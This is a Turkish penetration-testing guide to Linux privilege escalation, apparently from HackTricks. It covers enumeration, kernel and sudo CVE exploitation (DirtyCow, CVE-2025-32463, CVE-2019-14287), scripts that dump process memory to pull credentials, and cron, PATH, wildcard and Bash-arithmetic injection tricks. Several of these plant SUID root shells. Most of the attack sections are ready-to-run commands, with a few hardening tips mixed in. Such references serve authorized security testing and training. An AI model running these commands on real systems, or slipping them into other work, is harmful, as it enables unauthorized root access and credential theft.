# Linux Yetki Yükseltme

{{#include ../../../banners/hacktricks-training.md}}

Daha geniş bir arka plan ve geçmişte kullanılan keşif iş akışları için referanslarda listelenen g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation ve linux-private-i kaynaklarını inceleyin.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Sistem Bilgileri

### İşletim Sistemi bilgisi

Öncelikle çalışan işletim sistemi hakkında bilgi edinmeye başlayalım.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

**PATH** değişkenindeki herhangi bir klasöre yazma izniniz varsa bazı kütüphaneleri veya ikili dosyaları hijack edebilirsiniz:

```bash
echo $PATH
```

### Env bilgileri

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API key'ler var mı?

```bash
(env || set) 2>/dev/null
```

### Kernel exploitleri

Kernel sürümünü kontrol edin ve yetkileri yükseltmek için kullanılabilecek bir exploit olup olmadığını belirleyin.

[Kernel/LPE/CVE bölümü](../../main-system-information/kernel-lpe-cves/README.md), yerel yetki yükseltme vakalarını ve Binary Exploitation bölümündeki ayrıntılı Linux kernel incelemelerine bağlantıları içerir. Bir vaka çalışmasını test etmeden önce etkilenen derleme ve yapılandırmayı doğrulayın.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

İyi bir güvenlik açığı bulunan kernel listesi ve önceden **derlenmiş exploit'ler** şurada bulunabilir: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
**Derlenmiş exploit'ler** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Web'deki tüm güvenlik açığı bulunan kernel sürümlerini çıkarmak için şunu çalıştırabilirsiniz:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Kernel exploit'lerini aramaya yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim makinede çalıştırın; yalnızca kernel 2.x için exploit'leri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**; kernel sürümünüz bir kernel exploit'inde geçiyor olabilir. Böylece exploit'in geçerli olduğundan emin olabilirsiniz.

Ek kernel exploitation teknikleri:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo sürümü

Şurada yer alan savunmasız sudo sürümlerine göre:

```bash
searchsploit sudo
```

Bu grep'i kullanarak sudo sürümünün savunmasız olup olmadığını kontrol edebilirsiniz.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 ile 1.9.17** arasındaki sürümlerde, sudo `/etc/nsswitch.conf` dosyasını kullanıcının kontrolündeki bir dizinden yüklediğinde ayrıcalıksız yerel kullanıcılar `--chroot` seçeneğiyle root yetkilerine yükselebilir; upstream bu sorunu **1.9.17p1** sürümünde düzeltti. İlgili yollardaki root-setuid bitine sahip tüm sudo yürütülebilir dosyalarını kontrol edin; çünkü `sudo -V` yalnızca `PATH` tarafından seçilen ikili dosyayı bildirir. Dağıtım paketleri, upstream sürüm dizesini değiştirmeden düzeltmeyi geriye taşıyabilir; bu nedenle satıcı paketinin durumunu da doğrulayın. [sudo maintainer'ın güvenlik duyurusuna](https://www.openwall.com/lists/oss-security/2025/06/30/3) bakın.<sup>[[28]](#references)[[29]](#references)</sup>

İşte bu [güvenlik açığından](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) yararlanmak için bir [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot). Exploit'i çalıştırmadan önce `sudo` sürümünüzün güvenlik açığından etkilendiğinden ve `chroot` özelliğini desteklediğinden emin olun.

Daha fazla bilgi için orijinal [güvenlik açığı duyurusuna](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) bakın.<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

Upstream sudo **1.8.8 ile 1.9.17** arasındaki sürümlerde, host-based sudoers kuralları **gerçek hostname** yerine `sudo -h <host>` ile **kullanıcının sağladığı hostname** kullanılarak değerlendirilebilir; upstream bu sorunu **1.9.17p1** sürümünde düzeltti. Kullanıcının seçilen host için yine de eşleşen bir sudoers girdisi olmalıdır. Yerel ilkenin yanı sıra satıcı tarafından geriye taşınmış düzeltmeleri ve alternatif sudo ikili dosyalarını da inceleyin. [sudo maintainer'ın güvenlik duyurusuna](https://www.openwall.com/lists/oss-security/2025/06/30/2) bakın.<sup>[[29]](#references)</sup>

Gereksinimler:
- Güvenlik açığından etkilenen sudo sürümü
- Host'a özgü sudoers kuralları (host, mevcut hostname veya `ALL` olmamalıdır)

Örnek sudoers kalıbı:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

İzin verilen host'u spoof ederek exploit et:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Seçilen adın çözümlenmesi engelleniyorsa, bu adın host üzerinde nasıl çözümlendiğini doğrulayın. Bir adı yalnızca log veya yapılandırma dosyasında görmek, onun çözümlenebilir olduğu anlamına gelmez; ayrıca `/etc/hosts` dosyasını değiştirmek normalde ayrıcalıklı yazma erişimi gerektirir.

#### sudo < v1.8.28

Bu [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287), `(ALL, !root) /bin/bash` gibi, root hariç tüm kullanıcılar olarak bir komuta izin veren etkin bir sudo kuralı gerektirir. Çağıran kullanıcının, varsa kimlik doğrulama gereklilikleri de dahil olmak üzere, bu kuralı kullanmasına izin verilmelidir. Kurulu paketin güvenlik duyurusunu kontrol edin: dağıtıcılar, görüntülenen upstream sürümü hâlâ 1.8.28'in altında olan sürümlere düzeltmeyi backport etmiştir. Tek başına bir `!root` kuralı veya eski bir sürüm, sistemin etkilenebilir olduğunu doğrulamaz. Pasif keşif sırasında ayrıcalıklı bir komutu test etmeyin.

```
sudo -u#-1 /bin/bash
```

### Dmesg imza doğrulaması başarısız oldu

Bu zafiyetin nasıl istismar edilebileceğine dair bir **örnek** için HTB'deki **smasher2 box**'ını inceleyin.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Daha fazla sistem enumerasyonu

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Olası savunmaları listeleyin

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Bir container içindeyseniz, aşağıdaki container-security bölümünden başlayın ve ardından runtime’a özgü abuse sayfalarına geçin:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Sürücüler

**Nelerin mount edildiğini ve edilmediğini**, nerede ve neden olduğunu kontrol edin. Bir şey mount edilmemişse onu mount etmeyi deneyip özel bilgileri kontrol edebilirsiniz.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Faydalı yazılımlar

Faydalı ikili dosyaları listeleyin

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Ayrıca **herhangi bir derleyicinin kurulu olup olmadığını** kontrol edin. Bir kernel exploit kullanmanız gerekirse bu faydalıdır; exploit'i kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Yüklü Güvenlik Açığı Bulunan Yazılımlar

**Yüklü paketlerin ve servislerin sürümünü** kontrol edin. Örneğin, yetki yükseltmek için istismar edilebilecek eski bir Nagios sürümü olabilir…\
Daha şüpheli görünen yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

SSH erişiminiz varsa, makineye kurulu güncel olmayan ve güvenlik açığı bulunan yazılımları denetlemek için **openVAS** da kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğu işe yaramayacak pek çok bilgi göstereceğini unutmayın. Bu nedenle, kurulu yazılım sürümlerinden herhangi birinin bilinen exploit'lere karşı savunmasız olup olmadığını denetleyen OpenVAS veya benzeri uygulamaları kullanmanız önerilir._

## Processes

**Hangi süreçlerin** çalıştırıldığına bakın ve herhangi bir sürecin **olması gerekenden daha fazla ayrıcalığa** sahip olup olmadığını denetleyin (örneğin, root tarafından çalıştırılan bir tomcat olabilir mi?).

```bash
ps aux
ps -ef
top -n 1
```

Her zaman çalışan olası [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; bunları abuse ederek yetkilerinizi yükseltebilirsiniz. **Linpeas**, süreçlerin komut satırında `--inspect` parametresini arayarak bunları tespit eder.\
Ayrıca **süreç binary'leri üzerindeki yetkilerinizi de kontrol edin**; belki birinin dosyasının üzerine yazabilirsiniz.

### Farklı kullanıcılar arasındaki üst-alt süreç zincirleri

**Farklı bir kullanıcı** altında çalışan bir alt süreç, üst sürecinden farklı kullanıcıya ait diye otomatik olarak kötü amaçlı sayılmaz; ancak yararlı bir **triage sinyalidir**. Bazı geçişler beklenen durumlardır (`root` bir servis kullanıcısı altında süreç başlatması veya oturum yöneticilerinin oturum süreçleri oluşturması gibi); ancak olağandışı zincirler wrapper'ları, debug yardımcılarını, persistence'ı veya zayıf runtime trust boundary'lerini ortaya çıkarabilir.

Hızlı inceleme:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Şaşırtıcı bir zincir bulursanız, üst süreç komut satırını ve davranışını etkileyen tüm dosyaları (`config`, `EnvironmentFile`, yardımcı script’ler, çalışma dizini, yazılabilir argümanlar) inceleyin. Gerçek privesc yollarının birçoğunda alt süreç yazılabilir değildi; ancak **üst süreç tarafından denetlenen config** veya yardımcı zinciri yazılabilirdi.

### Silinmiş yürütülebilir dosyalar ve silindikten sonra açık kalan dosyalar

Çalışma zamanı yapıtlarına genellikle **silindikten sonra da** erişilebilir. Bu, hem ayrıcalık yükseltme hem de hassas dosyaları hâlâ açık tutan bir süreçten kanıt kurtarma için kullanışlıdır.

Silinmiş yürütülebilir dosyaları kontrol edin:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

`/proc/<PID>/exe` `(deleted)` konumunu gösteriyorsa, süreç bellekteki eski binary image'ı hâlâ çalıştırıyordur. Bu, araştırılması gereken güçlü bir işarettir çünkü:

- kaldırılan executable ilginç strings veya kimlik bilgileri içerebilir
- çalışan süreç hâlâ yararlı file descriptor'ları açığa çıkarabilir
- silinmiş ayrıcalıklı bir binary, yakın zamanda müdahale edildiğini veya temizleme girişiminde bulunulduğunu gösterebilir

Silinmiş, açık dosyaları genel olarak toplayın:

```bash
lsof +L1
```

İlginç bir tanımlayıcı bulursanız, doğrudan kurtarın:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Bu, özellikle bir süreç silinmiş bir secret dosyasını, script'i, veritabanı dışa aktarımını veya flag dosyasını hâlâ açık tuttuğunda çok değerlidir.

### Süreç izleme

Süreçleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçlar kullanabilirsiniz. Bu, sık sık çalıştırılan veya belirli koşullar karşılandığında çalıştırılan güvenlik açığı olan süreçleri belirlemek için çok yararlı olabilir.

#### sudo altında Linux ProcMon

[Linux için ProcMon](https://github.com/microsoft/ProcMon-for-Linux), seçilen süreçleri ve sistem çağrılarını izleyebilir ve bir SQLite trace dosyası kaydedebilir. `sudo -l` sınırsız, root yetkileriyle çalışabilen bir `procmon` komutuna izin veriyorsa, başka bir kullanıcının süreç girdisini veya çıktısını gözlemleyip gözlemleyemeyeceğini değerlendirin. Bu izin yalnızca inceleme için bir ipucudur: tracer desteği, etkin politika ve uygun bir sürecin etkinliği de önem taşır. Trace dosyaları secret içerebilir; bu nedenle yetkili dışa aktarımları dikkatlice inceleyin ve ilgisiz süreçleri toplamaktan kaçının.

### Süreç belleği

Bir sunucunun bazı servisleri **kimlik bilgilerini bellekte düz metin olarak saklar**.\
Normalde diğer kullanıcılara ait süreçlerin belleğini okumak için **root yetkilerine** ihtiyacınız olur. Bu nedenle, bu yöntem genellikle zaten root olduğunuzda daha fazla kimlik bilgisi keşfetmek için kullanışlıdır.\
Ancak, **normal bir kullanıcı olarak sahip olduğunuz süreçlerin belleğini okuyabileceğinizi** unutmayın.

> [!WARNING]
> Günümüzde çoğu makinenin **ptrace kullanımına varsayılan olarak izin vermediğini** unutmayın. Bu, ayrıcalıksız kullanıcınıza ait diğer süreçlerin belleğini dökemeyeceğiniz anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace erişilebilirliğini denetler:
>
> - **kernel.yama.ptrace_scope = 0**: Aynı uid'ye sahip oldukları sürece tüm süreçlerde hata ayıklanabilir. ptrace'in çalışma şekli geleneksel olarak böyleydi.
> - **kernel.yama.ptrace_scope = 1**: Yalnızca üst süreçte hata ayıklanabilir.
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE yeteneği gerektiğinden, ptrace'i yalnızca admin kullanabilir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bu değer ayarlandıktan sonra ptrace'i yeniden etkinleştirmek için sistemi yeniden başlatmak gerekir.

Bir parola kasasının kilidini kısa süreliğine açan, aynı UID'ye sahip bir süreç ayrı bir kimlik bilgisi sınırı oluşturabilir. İzlemeye izin verildiğinde etkin ve belleği dökülebilir bir süreç, girdi sistem çağrıları veya belleği aracılığıyla kasa parolasını açığa çıkarabilir; şifrelenmiş kasa dosyasının kendisi korumalı kalsa bile. `ptrace_scope=0` tek başına yeterli değildir: eşleşen kimlik bilgileri, hedef sürecin bellek dökümüne izin vermesi, diğer Linux güvenlik modülleri ve sürecin çalışma süresi de önem taşır. Bir kasa girdisinin Unix root oturum açma bilgisine dönüşmesi için ayrıca kimlik bilgilerinin yeniden kullanımını kontrol etmek gerekir. Rutin keşif, girdiyi yakalamak veya secret'ları yazdırmak yerine politikayı ve olası süreç ya da kasa yollarını raporlamalıdır. [Kernel'in Yama belgelerine](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) ve [ptrace erişim denetimlerine](https://man7.org/linux/man-pages/man2/ptrace.2.html) bakın.

#### GDB

Örneğin bir FTP servisinin belleğine erişiminiz varsa, Heap'i alıp içinde kimlik bilgilerini arayabilirsiniz.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Betiği

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir process ID için **maps, belleğin bu process'in sanal adres alanında nasıl eşlendiğini** gösterir; ayrıca **eşlenen her bölgenin izinlerini** de gösterir. **mem** sözde dosyası, **process'in belleğinin kendisine erişim sağlar**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların ofsetlerini öğreniriz. Bu bilgileri kullanarak **mem dosyasında ilgili konuma gider ve okunabilir tüm bölgeleri** bir dosyaya dökeriz.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem`, sistemin **fiziksel** belleğine erişim sağlar; sanal belleğe değil. Kernel'in sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubu tarafından okunabilir.

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux için ProcDump

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış sürümüdür. [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) adresinden edinebilirsiniz.

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Araçlar

Bir prosesin belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root gereksinimlerini manuel olarak kaldırabilir ve size ait prosesi dökebilirsiniz
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) adresindeki Script A.5 (root gerekir)

### Proses Belleğinden Kimlik Bilgileri

#### Manuel örnek

Kimlik doğrulayıcı prosesin çalıştığını görürseniz:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Process'i dump edebilir (bir process'in belleğini dump etmenin farklı yollarını bulmak için önceki bölümlere bakın) ve bellekte credentials arayabilirsiniz:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) aracı **bellekten düz metin kimlik bilgilerini** ve bazı **iyi bilinen dosyalardan** çalar. Düzgün çalışması için root ayrıcalıkları gerekir.

| Özellik                                           | İşlem Adı           |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Etkin FTP Bağlantıları)                   | vsftpd               |
| Apache2 (Etkin HTTP Basic Auth Oturumları)        | apache2              |
| OpenSSH (Etkin SSH Oturumları - Sudo Kullanımı)   | sshd:                |

#### Regex Araştırmaları/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Zamanlanmış/Cron işleri

### Root olarak çalışan Crontab UI (alseambusher) – web tabanlı zamanlayıcı privesc

Bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback’e bağlıysa, SSH yerel port yönlendirmesiyle yine de panele erişebilir ve ayrıcalık yükseltmek için yetkili bir iş oluşturabilirsiniz.<sup>[[1]](#references)[[4]](#references)</sup>

Tipik zincir
- Loopback’e özel portu (ör. 127.0.0.1:8000) ve Basic-Auth realm’ini `ss -ntlp` / `curl -v localhost:8000` ile keşfedin
- Kimlik bilgilerini operasyonel dosyalarda bulun:
  - `zip -P <password>` kullanan yedekler/betikler
  - `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` değerlerini açığa çıkaran systemd unit’leri
- Tünel oluşturun ve giriş yapın:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir job oluştur ve hemen çalıştır (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```

Güvenliği Sıkılaştırma
- Crontab UI’ı root olarak çalıştırmayın; özel bir kullanıcı kullanın ve izinleri en aza indirin
- localhost’a bağlayın ve erişimi ayrıca firewall/VPN üzerinden kısıtlayın; parolaları tekrar kullanmayın
- Secret’ları unit dosyalarına gömmekten kaçının; secret store’ları veya yalnızca root’un erişebildiği EnvironmentFile kullanın
- İsteğe bağlı job çalıştırmaları için audit/logging’i etkinleştirin

Zamanlanmış job’lardan herhangi birinin güvenlik açığı içerip içermediğini kontrol edin. Belki root tarafından çalıştırılan bir script’ten yararlanabilirsiniz (wildcard vuln? root’un kullandığı dosyaları değiştirebilir misiniz? symlink kullanabilir misiniz? root’un kullandığı dizinde belirli dosyalar oluşturabilir misiniz?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

`run-parts` kullanılıyorsa, hangi adların gerçekten çalıştırılacağını kontrol edin:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Bu, yanlış pozitifleri önler. Yazılabilir bir periyodik dizin, yalnızca payload dosya adınız yerel `run-parts` kurallarıyla eşleşiyorsa işe yarar.

### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH değerini bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_"user" kullanıcısının /home/user üzerinde yazma yetkisi olduğuna dikkat edin_)

Bu crontab içinde root kullanıcısı yolu ayarlamadan bir komut veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Şunu kullanarak bir root shell alabilirsiniz:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Wildcard içeren bir script kullanan Cron (Wildcard Injection)

Root tarafından çalıştırılan bir scriptin komutunda “**\***” varsa, bunu beklenmedik şeyler (privesc gibi) gerçekleştirmek için istismar edebilirsiniz. Örnek:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Wildcard'ın önünde** _**/some/path/\***_ **gibi bir yol varsa, bu güvenlik açığına karşı savunmasız değildir (hatta** _**./\***_ **bile değildir).**

Wildcard istismarına yönelik diğer püf noktaları için şu sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Cron log ayrıştırıcılarında Bash aritmetik genişletme enjeksiyonu

Bash aritmetiği, güvenilmeyen metni bir ifade olarak yorumlayabilir. Etkilenen Bash bağlamlarında, bu ifade içindeki bir dizi alt indisi komut ikamesini çalıştırabilir. Ayrıcalıklı bir cron/ayrıştırıcı, saldırganın kontrolündeki log metnini böyle bir aritmetik karşılaştırmaya yerleştirirse, komut ikamesi ayrıştırıcının kimliğiyle çalışabilir.<sup>[[22]](#references)</sup> Bu, kullanılan Bash ifadesine ve sürümüne bağlıdır; genişletilmiş bir değişkende tek başına bulunan yalın bir `$(...)0` dizesi, ifadenin yeniden değerlendirildiğini güvenilir biçimde göstermez.

Girdi, dosya meta verilerinden veya kullanıcı tarafından yazılabilir bir konumdan okunan başka bir alandan da gelebilir. Örneğin, bir görselin `Producer` etiketini okuyan ve `[[ "$producer" -eq "expected" ]]` ile karşılaştıran ayrıcalıklı bir temizleme betiği, değişken tırnak içine alınmış olsa da aritmetik karşılaştırma yapar. Zamanlanmış görevin hangi kimlikle çalıştığını, etiketi hangi dosyaların sağlayabileceğini, karşılaştırmadan önce yapılan tüm dönüşümleri ve Bash'in tam olarak nasıl davrandığını inceleyin. Metin etiketleri için dize karşılaştırması kullanın; sayılar içinse aritmetik işlem yapmadan önce girdinin yalnızca ondalık rakamlardan oluştuğunu doğrulayın. [Bash aritmetik kurallarına](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html) bakın.

- Yaygın savunmasız örüntü:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- array-subscript mekanizması için güvenli yerel davranış probu (ayrıcalıklı bir süreç veya dosya değişikliği olmadan):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Gerçekten zamanlanan script'i ve açtığı literal input path'i izleyin. Log file'ın kendisi yazılabilir olmasa bile, sticky bit bulunmayan üst dizinine yazma ve dizinde gezinme izni olan bir kullanıcı dizin girdisini değiştirebilir; `namei -l` bu izinleri ayırt etmeye yardımcı olur. Farklı bir yazılabilir log path'i, okunamayan bir scheduler veya bu alanı Bash arithmetic olarak değerlendirmeyen bir parser, bu path'in kullanılabileceğini göstermez.

### Cron script üzerine yazma ve symlink

Root tarafından çalıştırılan bir cron script'i **değiştirebiliyorsanız**, çok kolay bir shell elde edebilirsiniz:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Root tarafından çalıştırılan script, tam erişiminizin olduğu bir dizini kullanıyorsa, bu klasörü silip sizin kontrolünüzdeki bir scripti sunan başka bir dizine symlink oluşturmak işe yarayabilir.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink doğrulama ve daha güvenli dosya işleme

Dosyaları yol üzerinden okuyan veya yazan ayrıcalıklı betikleri/ikili dosyaları incelerken bağlantıların nasıl işlendiğini doğrulayın:

- `stat()` bir symlink'i izler ve hedefin meta verilerini döndürür.
- `lstat()` bağlantının kendisinin meta verilerini döndürür.
- `readlink -f` ve `namei -l`, son hedefi çözümlemeye ve yol bileşenlerinin her birinin izinlerini göstermeye yardımcı olur.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Defender'lar/geliştiriciler için symlink numaralarına karşı daha güvenli yöntemler şunlardır:

- `O_EXCL` ile `O_CREAT`: yol zaten varsa işlemi başarısız kılar (saldırganın önceden oluşturduğu bağlantıları/dosyaları engeller).
